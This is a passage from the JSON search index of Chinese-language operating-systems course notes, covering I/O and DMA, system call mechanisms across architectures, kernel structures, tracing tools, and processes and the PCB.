<li>\u5904\u7406\u540e\u6062\u590d\u6267\u884c\u72b6\u6001<ul> <li>\u6062\u590d pc \u7b49\u5bc4\u5b58\u5668\uff0c\u7ee7\u7eed\u56de\u53bb\u6267\u884c</li> <li>\u6216\u8005\u6062\u590d\u5176\u5b83\u8fdb\u7a0b\u7684\u5bc4\u5b58\u5668\uff0c\u5b9e\u73b0\u8c03\u5ea6</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic2/#io","title":"I/O \u5904\u7406","text":"<ul> <li>\u7528\u6237\u6001\u7a0b\u5e8f\u60f3\u8981\u64cd\u4f5c\u5916\u8bbe<ul> <li>\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\uff08system call\uff09\u6765\u544a\u8bc9 CPU \u8981\u64cd\u4f5c\u5916\u8bbe</li> </ul> </li> <li>\u64cd\u4f5c\u7cfb\u7edf\u901a\u8fc7 MMIO\uff08Memory Mapping I/O\uff09\u6765\u64cd\u7eb5\u5916\u8bbe</li> <li>\u4e24\u79cd\u652f\u6301\u7684 I/O \u5904\u7406\u65b9\u5f0f\uff1a<ul> <li>\u540c\u6b65 I/O\uff08synchronous I/O\uff09\uff1a\u8fdb\u884c I/O \u7684\u65f6\u5019 block \u6389\u5f53\u524d\u8bf7\u6c42 I/O \u7684\u7a0b\u5e8f\uff0c\u7b49\u5f85 I/O \u7ed3\u675f\uff08\u53ef\u80fd\u4f1a\u8c03\u5ea6\u8fd0\u884c\u53e6\u4e00\u4e2a\u7a0b\u5e8f\uff09<ul> <li>\u5e38\u7528\uff0c\u6613\u7528\uff0c\u4f46\u4e0d\u9ad8\u6548</li> </ul> </li> <li>\u5f02\u6b65 I/O\uff08asynchronous I/O\uff09\uff1a\u5373\u4f7f I/O \u6ca1\u6709\u5b8c\u6210\uff0c\u4ecd\u7136\u7ee7\u7eed\u8fd0\u884c\u539f\u7a0b\u5e8f\uff0c\u5f53 I/O \u5b8c\u6210\u65f6\uff0c\u6267\u884c\u7528\u6237\u6001\u5b9a\u4e49\u7684 callback \u56de\u8c03\u51fd\u6570<ul> <li>\u9ad8\u6548\uff0c\u5e38\u7528\u4e8e\u5904\u7406\u5927\u91cf\u7f51\u7edc\u8bf7\u6c42\u65f6</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic2/#dma","title":"DMA","text":"<ul> <li>\u6bd4\u5982 CPU \u60f3\u8ba9\u663e\u5361\u5728\u663e\u793a\u5668\u4e0a\u663e\u793a\u6570\u636e<ul> <li>\u6b63\u5e38\u60c5\u51b5<ul> <li>CPU \u5c06\u5927\u91cf\u6570\u636e\u4f9d\u6b21\u642c\u8fd0\u5230\u663e\u5361\u5bf9\u5e94\u7684\u5185\u5b58\u7a7a\u95f4\u4e0a</li> <li>\u671f\u95f4 CPU \u53ea\u505a\u8fd9\u4e00\u4ef6\u4e8b\uff0c\u65e0\u6cd5\u8fd0\u884c\u5176\u5b83\u7a0b\u5e8f</li> </ul> </li> <li>\u901a\u8fc7 DMA\uff08Direct Memory Access\uff09<ul> <li>CPU \u544a\u8bc9\u663e\u5361\u7684 DMA \u63a7\u5236\u5668\u8981\u642c\u8fd0\u7684\u6570\u636e\u5728\u54ea\u3001\u6709\u591a\u957f</li> <li>DMA \u63a7\u5236\u5668\u4f1a\u8fdb\u884c\u5927\u91cf\u6570\u636e\u7684\u642c\u8fd0</li> <li>\u6b64\u65f6 CPU \u53ef\u4ee5\u8fdb\u884c\u5176\u5b83\u8fd0\u7b97</li> <li>\u5b8c\u6210\u540e\u901a\u8fc7\u4e2d\u65ad\u6765\u901a\u77e5 CPU</li> </ul> </li> </ul> </li> <li>\u6709 DMA \u53ef\u4ee5\u5728\u6ca1\u6709 CPU \u53c2\u4e0e\u7684\u60c5\u51b5\u4e0b\u8fdb\u884c\u5927\u91cf\u6570\u636e\u7684\u642c\u8fd0</li> <li>\u95ee\u9898<ul> <li>\u5404\u4e2a\u8bbe\u5907\u90fd\u6709\u81ea\u5df1\u7684 DMA \u63a7\u5236\u5668\uff0c\u5728 DMA \u63a7\u5236\u5668\u8fdb\u884c\u6570\u636e\u642c\u8fd0\u7684\u65f6\u5019\u5168\u90e8\u7684\u7269\u7406\u5185\u5b58\u90fd\u66b4\u9732\u7ed9\u4e86\u5916\u8bbe<ul> <li>\u901a\u8fc7\u5185\u5b58\u548c DMA \u76f4\u63a5\u989d\u5916\u7684\u786c\u4ef6 IOMMU\uff08I/O \u5185\u5b58\u7ba1\u7406\u5355\u5143\uff09\u6765\u63a7\u5236\u53ef\u4ee5\u8bbf\u95ee\u54ea\u4e9b\u7269\u7406\u5185\u5b58</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic2/#_6","title":"\u591a\u6a21\u5f0f\u64cd\u4f5c","text":"<ul> <li>\u4e24\u4e2a\u6a21\u5f0f\uff08\u4e5f\u6709\u66f4\u591a\u7684\uff09<ul> <li>\u7528\u6237\u6001\uff08user mode\uff09</li> <li>\u5185\u6838\u6001\uff08kernel mode\uff09</li> </ul> </li> <li>CPU \u4e2d\u4f1a\u5b58\u50a8\u76f8\u5e94\u503c\u6765\u8bb0\u5f55\u5f53\u524d\u7684\u6a21\u5f0f</li> <li>\u4e00\u4e9b\u6307\u4ee4\u662f\u6709\u7279\u6743\u7ea7\u7684\uff0c\u53ea\u80fd\u5728\u5185\u6838\u6001\u6267\u884c</li> <li>system call<ul> <li>\u901a\u8fc7 trap \u6765\u8f6c\u5230\u5185\u6838\u6001</li> <li>\u5728 kernel \u4e2d\u6267\u884c\u6307\u5b9a\u64cd\u4f5c</li> <li>\u518d\u8fd4\u56de\u7528\u6237\u6001\u7ee7\u7eed\u6267\u884c</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic2/#_7","title":"\u53e6\u4e00\u4e2a\u89c6\u89d2","text":"<ul> <li>\u7a0b\u5e8f\u8fd0\u884c\u65f6 OS \u5728\u5e72\u4ec0\u4e48<ul> <li>\u4f7f\u7a0b\u5e8f\u6b63\u5e38\u8fd0\u884c</li> <li>\u5141\u8bb8\u7a0b\u5e8f\u4f7f\u7528\u3001\u5171\u4eab\u5b58\u50a8</li> <li>\u5141\u8bb8\u7a0b\u5e8f\u548c\u5916\u8bbe\u8fdb\u884c\u6c9f\u901a</li> </ul> </li> <li>\u5728\u505a\u201c\u865a\u62df\u5316\u201d\uff08Virtualization\uff09\u7684\u4e8b\u60c5<ul> <li>\u7ed9\u7528\u6237\u6001\u7a0b\u5e8f\u63d0\u4f9b\u865a\u62df\u7684\u8fd0\u884c\u73af\u5883</li> <li>\u4f7f\u7528\u6237\u6001\u7a0b\u5e8f\u8ba4\u4e3a\u81ea\u5df1\u53ef\u4ee5\u62e5\u6709\u5168\u90e8 CPU \u8d44\u6e90\u3001IO \u8d44\u6e90\u7b49</li> </ul> </li> <li>\u7a0b\u5e8f\u53ef\u4ee5\u901a\u8fc7 syscall \u6765\u4e0e OS \u6253\u4ea4\u9053</li> </ul> <p>\u561b\uff0c\u540e\u9762\u8fd8\u6709\u4e00\u5806\u611f\u89c9\u5f88\u957f\u65f6\u95f4\u5185\u4e0d\u4f1a\u7528\u5230\u3001\u4e0d\u4f1a\u5b66\u5230\u7684\u5bfc\u8bba\u5185\u5bb9\uff0c\u5c31\u4e0d\u8bb0\u4e86</p>"},{"location":"cs/system/cs2/topic3/","title":"\u64cd\u4f5c\u7cfb\u7edf\u7ed3\u6784\u4e0e\u7cfb\u7edf\u8c03\u7528","text":"<p> \u7ea6 1512 \u4e2a\u5b57  2 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 \u7b2c 9 \u81f3 10 \u5468\u8bfe\u7a0b\u5185\u5bb9</p>"},{"location":"cs/system/cs2/topic3/#_2","title":"\u64cd\u4f5c\u7cfb\u7edf\u670d\u52a1","text":"<ul> <li>\u7528\u6237\u89d2\u5ea6<ul> <li>\u7528\u6237\u63a5\u53e3\uff08UI\uff0cUser interface\uff09<ul> <li>CLI\uff08Command Line Interface / Command Interpreter\uff09\u6216 GUI</li> <li>CLI \u901a\u8fc7 shell \u7a0b\u5e8f</li> <li>\u547d\u4ee4\u5c31\u662f\u8981\u6267\u884c\u7684\u7a0b\u5e8f\u7684\u540d\u5b57<ul> <li>\u5bfb\u627e\u7a0b\u5e8f\uff1a\u901a\u8fc7 PATH \u73af\u5883\u53d8\u91cf</li> </ul> </li> <li>fork \u51fa\u4e00\u4e2a\u5b50\u8fdb\u7a0b\u8fdb\u884c\u6267\u884c</li> </ul> </li> <li>\u7a0b\u5e8f\u6267\u884c</li> <li>I/O \u64cd\u4f5c</li> <li>\u6587\u4ef6\u7cfb\u7edf\u64cd\u4f5c</li> <li>\u9519\u8bef\u5904\u7406</li> </ul> </li> <li>\u7cfb\u7edf\u89d2\u5ea6<ul> <li>\u5206\u914d\u8d44\u6e90<ul> <li>\u5f53\u591a\u7528\u6237/\u591a\u7a0b\u5e8f\u8fd0\u884c\u65f6\uff0c\u9700\u8981\u5206\u914d\u8d44\u6e90</li> <li>\u5305\u62ec CPU\u3001\u5185\u5b58\u3001\u6587\u4ef6\u3001I/O \u8bbe\u5907\u7b49</li> </ul> </li> <li>\u8bb0\u5f55\u7528\u6237\u3001\u65e5\u5fd7</li> <li>\u4fdd\u62a4\u5b89\u5168<ul> <li>\u8bbf\u95ee\u63a7\u5236</li> <li>\u8fdb\u7a0b\u9694\u79bb</li> <li>\u2026\u2026</li> </ul> </li> </ul> </li> <li>\u7a0b\u5e8f\u89d2\u5ea6<ul> <li>\u901a\u8fc7 system call \u7cfb\u7edf\u8c03\u7528\u6765\u63a5\u89e6\u64cd\u4f5c\u7cfb\u7edf\u670d\u52a1</li> <li>system call \u662f\u7a0b\u5e8f\u8bbf\u95ee\u64cd\u4f5c\u7cfb\u7edf\u670d\u52a1\u7684\u63a5\u53e3</li> <li>\u7ecf\u5e38\u901a\u8fc7 API\uff08Application Programming Interface\uff09\u6765\u4f7f\u7528\u3001\u53d1\u8d77\u7cfb\u7edf\u8c03\u7528<ul> <li>Win32 API\u3001POSIX API\u3001\u2026\u2026</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic3/#_3","title":"\u7cfb\u7edf\u8c03\u7528","text":""},{"location":"cs/system/cs2/topic3/#_4","title":"\u7cfb\u7edf\u8c03\u7528\u5b9e\u73b0","text":"<ul> <li>\u4e00\u4e2a\u7cfb\u7edf\u8c03\u7528\u5bf9\u5e94\u4e86\u4e00\u4e2a\u7f16\u53f7<ul> <li>Linux \u6709 340 \u5de6\u53f3\u4e2a\u7cfb\u7edf\u8c03\u7528\uff08x86 349 \u4e2a\u3001arm 345 \u4e2a\uff09</li> </ul> </li> <li>\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\u7684\u65f6\u5019\u901a\u8fc7 int/swi/ecall\uff08\u4e0d\u540c\u67b6\u6784\uff09\u6307\u4ee4\u89e6\u53d1\u4e2d\u65ad<ul> <li>CPU \u5c06\u7528\u6237\u6001\u53d8\u5230\u5185\u6838\u6001\uff0c\u5e76\u5c06 pc \u6539\u4e3a\u5904\u7406\u7a0b\u5e8f\u4f4d\u7f6e</li> <li>\u5904\u7406\u7a0b\u5e8f\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\u53f7\u6765\u8c03\u7528\u76f8\u5e94\u7684\u7cfb\u7edf\u8c03\u7528\u5904\u7406\u7a0b\u5e8f</li> </ul> </li> <li>\u7528\u6237\u6001\u5411\u5185\u6838\u6001\u4f20\u9012\u53c2\u6570\u7684\u65b9\u5f0f<ul> <li>\u901a\u8fc7\u5bc4\u5b58\u5668\u4f20\u9012<ul> <li>\u5728\u5207\u6362\u5230\u5185\u6838\u6001\u4e4b\u540e\uff0c\u8bfb\u53d6\u4e4b\u524d\u8bbe\u5b9a\u597d\u7684\u89c4\u5b9a\u7684\u5bc4\u5b58\u5668\u503c\u4f5c\u4e3a\u53c2\u6570</li> <li>\u7b80\u5355\uff0c\u4f46\u53ef\u80fd\u4e0d\u591f\u653e</li> </ul> </li> <li>\u901a\u8fc7 Block \u4f20\u9012<ul> <li>\u5c06\u53c2\u6570\u653e\u5728\u5185\u5b58\u4e2d\u4f5c\u4e3a\u4e00\u4e2a Block / Table</li> <li>\u901a\u8fc7\u5bc4\u5b58\u5668\u4f20\u9012 Block \u7684\u5730\u5740</li> <li>Linux \u4f7f\u7528\u7684\u65b9\u5f0f</li> </ul> </li> <li> <p>\u901a\u8fc7\u6808\u4f20\u9012</p> <ul> <li>\u5c06\u53c2\u6570\u653e\u5728/\u538b\u5165\u6808\uff08\u5185\u5b58\uff09\u4e2d</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u5c06\u53c2\u6570\u4ece\u6808\u4e2d pop \u51fa\u6765</li> </ul> \u6709\u5173\u6808 <p>\u6240\u8bf4\u7684\u6808\u5176\u5b9e\u4e0d\u662f\u786c\u4ef6\u4e2d\u771f\u6b63\u5b58\u5728\u7684\u6808\u7ed3\u6784\uff0c\u800c\u662f\u5185\u5b58\uff0c\u901a\u8fc7\u4e00\u79cd\u6808\u7684\u5f62\u5f0f\u6765\u4f7f\u7528\u3002</p> <p>push\u3001pop \u4e5f\u662f\u4f2a\u6307\u4ee4\uff0c\u5b9e\u9645\u4e0a\u505a\u7684\u662f\u64cd\u4f5c\u5185\u5b58\uff0c\u4fee\u6539\u6307\u9488\u3002</p> <p>\u786c\u4ef6\u4e2d\u4e5f\u786e\u5b9e\u6709\u6808\u7ed3\u6784\uff0c\u79f0\u4e3a\u786c\u4ef6\u6808\uff08Hardware Stack\uff09\u6216\u8005\u5f71\u5b50\u6808\uff08Shadow Stack\uff09\uff0c\u5bf9\u4e8e\u7528\u6237\u3001\u7cfb\u7edf\u90fd\u662f\u9690\u85cf\u7684\uff0c\u662f\u7528\u4e8e\u4fdd\u62a4\u5b89\u5168\u7684\uff1a</p> <ul> <li>\u8c03\u7528\u51fd\u6570\u7684\u65f6\u5019\uff0c\u4f1a\u5c06\u5f53\u524d\u8c03\u7528\u7684\u8fd4\u56de\u5730\u5740\u5199\u5230\u5f53\u524d\u8fd0\u884c\u7684\u201c\u6808\u201d\u91cc\u9762\uff0c\u7528\u6765\u8fd4\u56de</li> <li>\u540c\u65f6\u4e5f\u4f1a\u5c06\u8fd4\u56de\u5730\u5740\u62f7\u8d1d\u4e00\u4efd\u653e\u5165\u5f71\u5b50\u6808\u91cc\u9762</li> <li>\u5728\u51fd\u6570\u8fd4\u56de\u7684\u65f6\u5019\uff0c\u4f1a\u6bd4\u8f83\u5f53\u524d\u201c\u6808\u201d\u91cc\u7684\u8fd4\u56de\u5730\u5740\u548c\u5f71\u5b50\u6808\u91cc\u7684\u8fd4\u56de\u5730\u5740\uff1a<ul> <li>\u5982\u679c\u4e0d\u4e00\u81f4\uff0c\u8bf4\u660e\u8fd4\u56de\u5730\u5740\u53ef\u80fd\u88ab\u6076\u610f\u8986\u5199<ul> <li>\u629b\u51fa\u5f02\u5e38\u5e76\u7ec8\u6b62\u7a0b\u5e8f</li> <li>\u4e5f\u6709\u53ef\u80fd\u4ee5\u5f71\u5b50\u6808\u4e2d\u7684\u8fd4\u56de\u5730\u5740\u4e3a\u51c6\u8fdb\u884c\u8fd4\u56de</li> </ul> </li> <li>\u5982\u679c\u4e00\u81f4\uff0c\u5219\u6b63\u5e38\u8fd4\u56de\u7ee7\u7eed\u6267\u884c</li> </ul> </li> </ul> </li> </ul> </li> </ul> <p>\u4e00\u4e9b\u4f8b\u5b50\uff1a</p> <ul> <li>Linux/x86 \u7684 execve \u7cfb\u7edf\u8c03\u7528<ul> <li><code>execve(\"/bin/sh\", 0, 0)</code></li> <li>eax \u4e2d\u5b58\u50a8\u7cfb\u7edf\u8c03\u7528\u53f7 0x0b</li> <li>ebx \u4e2d\u5b58\u50a8\u7b2c\u4e00\u4e2a\u53c2\u6570\uff08\"/bin/sh\" \u7684\u5730\u5740\uff09</li> <li>ecx \u5b58\u50a8\u7b2c\u4e8c\u4e2a\u53c2\u6570 0\uff0cedx \u5b58\u50a8\u7b2c\u4e09\u4e2a\u53c2\u6570 0</li> <li>\u901a\u8fc7 int 0x80 \u6267\u884c\u7cfb\u7edf\u8c03\u7528</li> <li>\u6267\u884c\u540e\u8fd4\u56de\u7ed3\u679c\u5728 eax \u4e2d</li> </ul> </li> <li>Linux/ARM \u7684 execve \u7cfb\u7edf\u8c03\u7528<ul> <li>\u901a\u8fc7 C \u8bed\u8a00 ABI \u6765\u5c06\u53c2\u6570\u653e\u5728\u5bf9\u5e94\u5bc4\u5b58\u5668\u4e2d</li> <li>\u5c06 execve \u5bf9\u5e94\u7684\u7cfb\u7edf\u8c03\u7528\u5730\u5740\uff08\u57fa\u5730\u5740+\u8c03\u7528\u53f7 11\uff09\u653e\u5728 r7 \u5bc4\u5b58\u5668\u4e2d</li> <li>\u8c03\u7528 swi \u6307\u4ee4\u6267\u884c\u7cfb\u7edf\u8c03\u7528</li> <li>\u8fd4\u56de\u503c\u5728 r0 \u5bc4\u5b58\u5668\u4e2d</li> </ul> </li> </ul> <p>RISC-V \u4e2d\u7cfb\u7edf\u8c03\u7528\u7684\u786c\u4ef6\u5b9e\u73b0\uff1a</p> <ul> <li>\u901a\u8fc7 ecall \u6307\u4ee4\u6765\u629b\u51fa\u5f02\u5e38\uff08Environment Call from U-mode\u3001\u2026\u2026\uff09</li> <li>\u68c0\u67e5 sedeleg \u5bc4\u5b58\u5668\uff08\u662f\u5426\u5c06\u8be5\u5f02\u5e38\u4ee3\u7406\u7ed9 Supervisor \u6a21\u5f0f\uff09<ul> <li>\u5982\u679c\u4ee3\u7406\u7ed9\u4e86 S \u6a21\u5f0f<ul> <li>\u5c06 pc \u503c\u4fdd\u5b58\u5230 sepc \u5bc4\u5b58\u5668\u4e2d</li> <li>\u5c06\u7279\u6743\u7ea7\u63d0\u5347\u5230 Supervisor</li> <li>\u8df3\u8f6c\u5230 stvec \u5b58\u50a8\u7684\u5730\u5740\uff0c\u6267\u884c\u5185\u6838\u5b9a\u4e49\u7684 handler \u7a0b\u5e8f</li> <li>\u964d\u7ea7\u5230 User \u6a21\u5f0f\uff0c\u8fd4\u56de\u5230 sepc</li> </ul> </li> <li>\u5982\u679c\u6ca1\u6709\u4ee3\u7406<ul> <li>\u5c06 pc \u503c\u4fdd\u5b58\u5230 mepc \u4e2d</li> <li>\u5c06\u7279\u6743\u7ea7\u63d0\u5347\u5230 Machine</li> <li>\u8df3\u8f6c\u5230 mtvec \u5b58\u50a8\u7684\u5730\u5740\uff0c\u6267\u884c SBI \u5b9a\u4e49\u7684 handler \u7a0b\u5e8f</li> <li>\u964d\u7ea7\u5230 User \u6a21\u5f0f\uff0c\u8fd4\u56de\u5230 mepc</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic3/#_5","title":"\u7cfb\u7edf\u8c03\u7528\u7c7b\u522b","text":"<ul> <li>\u8fdb\u7a0b\u63a7\u5236<ul> <li>\u521b\u5efa\u8fdb\u7a0b fork\uff0c\u7ed3\u675f\u5b50\u8fdb\u7a0b exit\uff0c\u7b49\u5f85 wait\u3001\u2026\u2026</li> </ul> </li> <li>\u6587\u4ef6\u7ba1\u7406<ul> <li>\u521b\u5efa\u6587\u4ef6\u3001\u5220\u9664\u6587\u4ef6\u3001\u6253\u5f00\u6587\u4ef6\u3001\u5173\u95ed\u6587\u4ef6\u3001\u8bfb\u5199\u3001\u2026\u2026</li> </ul> </li> <li>\u8bbe\u5907\u7ba1\u7406</li> <li>\u4fe1\u606f\u7ef4\u62a4<ul> <li>\u83b7\u53d6\u5f53\u524d\u65e5\u671f\u3001\u65f6\u95f4\u3001\u8fdb\u7a0b\u5c5e\u6027\u3001\u2026\u2026</li> </ul> </li> <li>\u901a\u4fe1</li> <li>\u4fdd\u62a4</li> </ul>"},{"location":"cs/system/cs2/topic3/#_6","title":"\u64cd\u4f5c\u7cfb\u7edf\u7ed3\u6784","text":"<ul> <li>\u7b80\u5355\u7ed3\u6784\uff08\u6ca1\u6709\u7ed3\u6784\uff09\uff1aMS-DOS<ul> <li>\u4e0d\u533a\u5206\u7528\u6237\u6001\u3001\u5185\u6838\u6001</li> <li>\u7528\u6237\u7a0b\u5e8f\u3001\u64cd\u4f5c\u7cfb\u7edf\u7a0b\u5e8f\u3001\u9a71\u52a8\u7a0b\u5e8f\u90fd\u8fd0\u884c\u5728\u540c\u4e00\u4e2a\u5730\u5740\u7a7a\u95f4\uff0c\u53ef\u4ee5\u4e92\u76f8\u64cd\u4f5c</li> </ul> </li> <li>\u6574\u4f53\u5185\u6838\uff08Monolithic Kernel\uff09\u7ed3\u6784\uff1aUNIX<ul> <li>\u7528\u6237\u6001\u7a0b\u5e8f\u3001\u5185\u6838\u6001\u7a0b\u5e8f\u9694\u79bb</li> <li>\u5185\u6838\u6001\u7a0b\u5e8f\u7ed9\u7528\u6237\u6001\u7a0b\u5e8f\u63a5\u53e3\u6765\u63d0\u4f9b\u670d\u52a1</li> <li>\u5185\u6838\u670d\u52a1\u90fd\u96c6\u6210\u5728\u4e00\u8d77</li> </ul> </li> <li>\u5fae\u5185\u6838\uff08Microkernel\uff09\u7ed3\u6784\uff1aMinix\u3001Mach\u3001QNX\u3001L4\u3001\u2026\u2026<ul> <li>\u9632\u6b62\u5185\u6838\u6001\u7a0b\u5e8f\u8fc7\u4e8e\u590d\u6742\uff0c\u6f0f\u6d1e\u6982\u7387\u66f4\u5927</li> <li>\u5c3d\u53ef\u80fd\u591a\u5730\u5c06\u5185\u6838\u4ee3\u7801\u79fb\u52a8\u5230\u7528\u6237\u6001\u4e2d</li> <li>\u5185\u6838\u53ea\u63d0\u4f9b\u6700\u57fa\u672c\u7684\u670d\u52a1\uff0c\u5176\u4ed6\u670d\u52a1\u90fd\u7531\u7528\u6237\u6001\u7a0b\u5e8f\u63d0\u4f9b</li> <li>\u901a\u8fc7 message passing \u6765\u5b9e\u73b0\u5185\u6838\u4e0e\u7528\u6237\u6001\u7a0b\u5e8f\u7684\u901a\u4fe1</li> <li>\u4f18\u70b9\uff1a\u6613\u4e8e\u6269\u5c55\u3001\u6613\u4e8e\u7ef4\u62a4\u3001\u66f4\u5b89\u5168</li> <li>\u7f3a\u70b9\uff1a\u6027\u80fd\u5f00\u9500\u8fc7\u5927\uff08\u5f88\u591a message passing\uff09</li> </ul> </li> <li>\u6a21\u5757\u5316\u5185\u6838\uff08Modular Kernel\uff09\u7ed3\u6784<ul> <li>\u5c06\u5185\u6838\u5206\u4e3a\u591a\u4e2a\u53ef\u52a0\u8f7d\u5185\u6838\u6a21\u5757\uff08loadable kernel module\uff09\uff0c\u6bcf\u4e2a\u6a21\u5757\u90fd\u6709\u81ea\u5df1\u7684\u529f\u80fd</li> <li>\u53ef\u4ee5\u52a0\u8f7d .ko \u6a21\u5757\u6587\u4ef6\u8fdb\u884c\u6269\u5c55<ul> <li>\u5bf9\u4e8e\u7cfb\u7edf\u7248\u672c\u8981\u6c42\u82db\u523b</li> </ul> </li> <li>\u6613\u4e8e\u6269\u5c55\uff0c\u4f46\u6ca1\u5fae\u5185\u6838\u5bb9\u6613\u6269\u5c55\uff08\u56e0\u4e3a\u6a21\u5757\u548c\u7248\u672c\u7d27\u5bc6\u7ed1\u5b9a\uff09</li> <li>Linux\uff1aMonolithic + Modular</li> </ul> </li> <li>\u5916\u5185\u6838\uff08Exokernel\uff09\u7ed3\u6784<ul> <li>\u4e0a\u9762\u90fd\u662f\u901a\u7528\u7cfb\u7edf\u5185\u6838\uff0c\u901a\u8fc7\u5185\u6838\u6765\u63d0\u4f9b\u5404\u79cd\u670d\u52a1</li> <li>\u5916\u5185\u6838\u5219\u8fdb\u884c\u66f4\u5c11\u7684\u62bd\u8c61\uff0c\u6765\u8ba9\u7528\u6237\u7a0b\u5e8f\u53ef\u4ee5\u6709\u66f4\u591a\u63a7\u5236\u7269\u7406\u8d44\u6e90\u7684\u53ef\u80fd</li> <li>\u5185\u6838\u53ea\u8fdb\u884c\u7269\u7406\u8d44\u6e90\u7684\u5206\u914d\u548c\u4fdd\u62a4\uff0c\u800c\u8d44\u6e90\u7684\u4f7f\u7528\u3001\u7ba1\u7406\u90fd\u7531\u7528\u6237\u7a0b\u5e8f\u81ea\u5df1\u51b3\u5b9a</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic3/#tracing","title":"Tracing","text":"<ul> <li>\u5728\u8fd0\u884c\u7684\u65f6\u5019\u641c\u96c6\u6570\u636e</li> <li>\u5de5\u5177\uff1a<ul> <li>strace\uff1a\u8ddf\u8e2a\u4e00\u4e2a\u8fdb\u7a0b\u5728\u8fd0\u884c\u7684\u65f6\u5019\u8fdb\u884c\u4e86\u54ea\u4e9b\u7cfb\u7edf\u8c03\u7528</li> <li>gdb\uff1a\u6e90\u7801\u7ea7\u8c03\u8bd5\u5668</li> <li>perf\uff1aLinux \u6027\u80fd\u5206\u6790\u5de5\u5177\u5305</li> <li>tcpdump\uff1a\u6536\u96c6\u7f51\u7edc\u6570\u636e\u5305</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic4/","title":"\u8fdb\u7a0b\u4e0e\u7ebf\u7a0b","text":"<p> \u7ea6 4226 \u4e2a\u5b57  14 \u884c\u4ee3\u7801  6 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 14 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 \u7b2c 10 \u81f3 12 \u5468\u8bfe\u7a0b\u5185\u5bb9</p>"},{"location":"cs/system/cs2/topic4/#_2","title":"\u8fdb\u7a0b","text":"<p>\u7a0b\u5e8f\u7684\u6267\u884c\u8fc7\u7a0b\uff0c\u662f\u64cd\u4f5c\u7cfb\u7edf\u8fdb\u884c\u8d44\u6e90\u5206\u914d\u548c\u8c03\u5ea6\u7684\u57fa\u672c\u5355\u4f4d\u3002</p>"},{"location":"cs/system/cs2/topic4/#_3","title":"\u8fdb\u7a0b\u7684\u7ec4\u6210","text":"<ul> <li>\u7a0b\u5e8f\u4ee3\u7801\uff0c\u5373 text \u6bb5</li> <li>\u8fd0\u884c\u65f6 CPU \u72b6\u6001\uff0c\u5305\u62ec pc\u3001\u5bc4\u5b58\u5668\u7b49</li> <li>\u591a\u79cd\u5185\u5b58\u7a7a\u95f4\uff08\u4eba\u4e3a\u89c4\u5b9a\u7684\uff0c\u4e0d\u662f\u786c\u4ef6\u6982\u5ff5\uff09\uff1a<ul> <li>\u6808\uff08stack\uff09\uff1a\u4e34\u65f6\u7684\u6570\u636e\uff1a\u5c40\u90e8\u53d8\u91cf\u3001\u51fd\u6570\u8c03\u7528\u53c2\u6570\u3001\u8fd4\u56de\u5730\u5740\u7b49</li> <li>\u5806\uff08heap\uff09\uff1a\u8fd0\u884c\u65f6\u52a8\u6001\u5206\u914d\u7684\u5185\u5b58</li> <li>data \u6bb5\uff1a\u5168\u5c40\u53d8\u91cf</li> <li>\u2026\u2026</li> </ul> </li> </ul> <p>\u901a\u8fc7 cat /proc/$pid/maps \u53ef\u4ee5\u67e5\u770b\u8fdb\u7a0b\u7684\u865a\u62df\u5185\u5b58\u5e03\u5c40\u3002</p> <p> </p>"},{"location":"cs/system/cs2/topic4/#_4","title":"\u8fdb\u7a0b\u7684\u72b6\u6001","text":"<ul> <li>\u65b0\u5efa\uff08new\uff09\uff1a\u8fdb\u7a0b\u6b63\u5728\u88ab\u521b\u5efa</li> <li>\u8fd0\u884c\uff08running\uff09\uff1a\u8fdb\u7a0b\u6b63\u5728\u88ab CPU \u6267\u884c</li> <li>\u7b49\u5f85\uff08waiting/blocking\uff09\uff1a\u8fdb\u7a0b\u6b63\u5728\u7b49\u5f85\u67d0\u4e2a\u4e8b\u4ef6\u7684\u53d1\u751f</li> <li>\u5c31\u7eea\uff08ready\uff09\uff1a\u8fdb\u7a0b\u5df2\u7ecf\u51c6\u5907\u597d\uff0c\u7b49\u5f85\u88ab CPU \u6267\u884c</li> <li>\u7ec8\u6b62\uff08terminated\uff09\uff1a\u8fdb\u7a0b\u5df2\u7ecf\u7ec8\u6b62</li> </ul>"},{"location":"cs/system/cs2/topic4/#_5","title":"\u8fdb\u7a0b\u63a7\u5236\u5757","text":"<p>\u8fdb\u7a0b\u63a7\u5236\u5757\uff08Process Control Block\uff0cPCB\uff09\u662f\u64cd\u4f5c\u7cfb\u7edf\u4e3a\u6bcf\u4e00\u4e2a\u8fdb\u7a0b\u7ef4\u62a4\u7684\u6570\u636e\u7ed3\u6784\u3002</p> <p>Linux \u4e2d\u901a\u8fc7 task_struct \u7ed3\u6784\u4f53\u6765\u5b58\u50a8\uff0c\u5185\u5bb9\uff1a</p> <ul> <li><code>pid_t pid</code>\uff1a\u8fdb\u7a0b\u53f7</li> <li><code>long state</code>\uff1a\u8fdb\u7a0b\u72b6\u6001</li> <li><code>unsigned int time_slice</code>\uff1a\u65f6\u95f4\u7247</li> <li><code>struct task_struct *parent</code>\uff1a\u7236\u8fdb\u7a0b</li> <li><code>struct list_head children</code>\uff1a\u5b50\u8fdb\u7a0b</li> <li><code>struct files_struct *files</code>\uff1a\u6253\u5f00\u7684\u6587\u4ef6</li> <li><code>struct mm_struct *mm</code>\uff1a\u8fdb\u7a0b\u7684\u5185\u5b58\u7a7a\u95f4</li> <li>\u2026\u2026</li> <li>pc\u3001\u5bc4\u5b58\u5668\u7b49</li> </ul>"},{"location":"cs/system/cs2/topic4/#_6","title":"\u8fdb\u7a0b\u8c03\u5ea6","text":"<ul> 